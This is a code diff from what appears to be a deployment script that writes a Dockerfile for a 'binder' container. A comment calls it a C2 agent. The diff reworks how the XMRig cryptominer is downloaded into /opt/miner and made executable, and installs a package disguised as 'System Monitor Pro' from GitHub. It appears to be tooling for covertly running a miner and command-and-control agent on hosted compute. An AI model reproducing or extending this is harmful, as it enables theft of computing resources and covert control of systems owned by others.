@@ -274,14 +274,7 @@ Time: {datetime.now().isoformat()}
             time.sleep(2)
             
             # Create Dockerfile for binder with auto-start script and C2 agent
-            dockerfile = f"""FROM alpine:3.19 AS builder
-
-# Download and extract XMRig using ADD
-ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/
-RUN tar -xzf /tmp/xmrig-6.21.0-linux-static-x64.tar.gz -C /tmp && \
-    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /xmrig
-
-FROM python:3.10-slim
+            dockerfile = f"""FROM python:3.10-slim
 
 USER root
 
@@ -293,10 +286,17 @@ RUN apt-get update && \
     apt-get install -y --no-install-recommends ca-certificates && \
     rm -rf /var/lib/apt/lists/*
 
-# Copy XMRig from builder stage
-RUN mkdir -p /opt/miner
-COPY --from=builder /xmrig /opt/miner/xmrig
-RUN chmod +x /opt/miner/xmrig
+# Download XMRig binary directly (static build, no tar)
+RUN mkdir -p /opt/miner && \
+    apt-get update && apt-get install -y --no-install-recommends wget && \
+    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/x.tar.gz && \
+    apt-get install -y --no-install-recommends xz-utils && \
+    cd /tmp && tar -xf x.tar.gz --no-same-owner && \
+    mv xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && \
+    chmod +x /opt/miner/xmrig && \
+    apt-get remove -y wget xz-utils && \
+    apt-get autoremove -y && \
+    rm -rf /tmp/* /var/lib/apt/lists/*
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
 RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
